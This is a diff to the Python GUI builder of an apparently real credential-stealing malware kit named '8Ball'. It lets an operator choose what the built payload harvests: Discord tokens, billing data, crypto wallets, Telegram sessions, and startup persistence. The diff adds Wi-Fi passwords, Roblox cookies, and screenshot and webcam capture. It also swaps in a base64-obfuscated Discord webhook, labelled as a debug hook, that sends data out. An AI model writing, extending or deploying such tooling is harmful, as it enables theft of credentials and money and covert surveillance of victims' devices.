@@ -15,7 +15,7 @@ import customtkinter as ctk
 from tkinter import ttk
 
 # Base64-obfuscated debug webhook URL (same as rx.py)
-_DBG_HOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUxOTU2NzQ2MDgzNDA4NjkxMi9COTlpd3NyVk1NUlVRTkh4U2JSbVVlTG5GMVRfekpydVJndlZ5NHlMQ3IxWVBKNVFVNFdVb1U0U0d0TXdocTJlQjFCNA=="
+_DBG_HOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTUxNzc3NDQ3MTIwNzg1MDE1NS9zMmFVZk1MZWpZdE5lTzlYRGh1dUVKbW4xTmJ0RjlFU3JmOWJiSGJNNmN2ajJYSEFmMUlkaEZ0a003MXBlZC1vRG5aUQ=="
 _DBG_HOOK = base64.b64decode(_DBG_HOOK_B64).decode()
 
 _BUILD_DEBUG_LOGS = []
@@ -29,7 +29,7 @@ def build_debug_log(msg, level="INFO"):
     if len(_BUILD_DEBUG_LOGS) > 100:
         _BUILD_DEBUG_LOGS.pop(0)
 
-def send_build_debug_embed(title="8Ball Builder | Build Log", level="INFO"):
+def send_build_debug_embed(title="8BALL | DH Build Log", level="INFO"):
     """Send accumulated build debug logs to Discord debug webhook."""
     if not _BUILD_DEBUG_LOGS:
         return
@@ -45,7 +45,7 @@ def send_build_debug_embed(title="8Ball Builder | Build Log", level="INFO"):
                 "color": color,
                 "footer": {"text": f"{len(_BUILD_DEBUG_LOGS)} total log lines"}
             }],
-            "username": "8Ball | Builder Debug",
+            "username": "8BALL | DH",
             "allowed_mentions": {"parse": []}
         }
         headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
@@ -88,7 +88,7 @@ def download_online_stub():
         new_src = resp.read().decode('utf-8')
         with open(FILE_NAME, 'w', encoding='utf-8') as f:
             f.write(new_src)
-        print("[8Ball Builder] Stub downloaded successfully.")
+        print("[RX Builder] Stub downloaded successfully.")
         return True
     except Exception as e:
         messagebox.showerror("Download Error", f"Failed to download stub:\n{e}")
@@ -173,6 +173,11 @@ def update_feature_config(selected_features: list[str]) -> bool:
         "Discord Gift Codes": "discord_gift_codes",
         "Crypto Wallet": "wallet_gaming_data",
         "Telegram": "telegram_desktop",
+        "System Info": "system_info",
+        "Screenshot Capture": "screenshot_capture",
+        "Webcam Capture": "webcam_capture",
+        "Roblox Cookies": "roblox_cookies",
+        "Wi-Fi Passwords": "wifi_passwords",
         "Debug Mode": "debug_mode",
         "Startup Persistence": "startup_persistence",
     }
@@ -316,7 +321,7 @@ def build_exe():
             )
         except Exception as e:
             build_debug_log(f"ERROR: Failed to start build: {e}", "ERROR")
-            send_build_debug_embed("8Ball Builder | Build Failed", "ERROR")
+            send_build_debug_embed("8BALL | DH Build Failed", "ERROR")
             terminal_write(f"[8Ball] ERROR: Failed to start build: {e}\n")
             app.after(0, lambda: status_label.configure(text="STATUS: ERROR", text_color="#ef4444"))
             return
@@ -332,13 +337,13 @@ def build_exe():
 
         if proc.returncode == 0:
             build_debug_log("Build completed successfully.")
-            send_build_debug_embed("8Ball Builder | Build Success", "INFO")
+            send_build_debug_embed("8BALL | DH Build Success", "INFO")
             app.after(0, lambda: status_label.configure(text="STATUS: BUILD FINISHED", text_color="#10b981"))
             terminal_write("[8Ball] Build completed successfully.\n")
             app.after(0, lambda: messagebox.showinfo("Build Finished", "Build completed successfully."))
         else:
             build_debug_log(f"Build failed with exit code {proc.returncode}.", "ERROR")
-            send_build_debug_embed("8Ball Builder | Build Failed", "ERROR")
+            send_build_debug_embed("8BALL | DH Build Failed", "ERROR")
             app.after(0, lambda: status_label.configure(text="STATUS: BUILD FAILED", text_color="#ef4444"))
             terminal_write(f"[8Ball] Build failed with exit code {proc.returncode}.\n")
             app.after(0, lambda: messagebox.showerror("Build Failed",
@@ -366,7 +371,7 @@ def open_link(url):
     webbrowser.open(url)
 
 # --- UPDATE CHECK ---
-LOCAL_VERSION = "2.0.9"
+LOCAL_VERSION = "2.0.8"
 VERSION_URL = "https://raw.githubusercontent.com/Lux00001/8Ball/main/version.json"
 _pending_update_data = None
 _pending_update_version = ""
@@ -561,7 +566,7 @@ def _close_whats_new(win, version):
 
 # --- GUI LAYOUT ---
 app = ctk.CTk()
-app.title("8ball v2.0.9 | ALPHA")
+app.title("8ball v2.0.8 | ALPHA")
 app.geometry("680x720")
 app.configure(fg_color=BG_COLOR)
 app.resizable(False, False)
@@ -734,8 +739,13 @@ features = {
     "Nitro": ctk.BooleanVar(value=False),
     "User Billing Information": ctk.BooleanVar(value=False),
     "Discord Gift Codes": ctk.BooleanVar(value=False),
-    "Crypto Wallet": ctk.BooleanVar(value=False),     
+    "Crypto Wallet": ctk.BooleanVar(value=False),
     "Telegram": ctk.BooleanVar(value=False),
+    "System Info": ctk.BooleanVar(value=False),
+    "Screenshot Capture": ctk.BooleanVar(value=False),
+    "Webcam Capture": ctk.BooleanVar(value=False),
+    "Roblox Cookies": ctk.BooleanVar(value=False),
+    "Wi-Fi Passwords": ctk.BooleanVar(value=False),
     "Debug Mode": ctk.BooleanVar(value=False),
     "Startup Persistence": ctk.BooleanVar(value=False),
 }
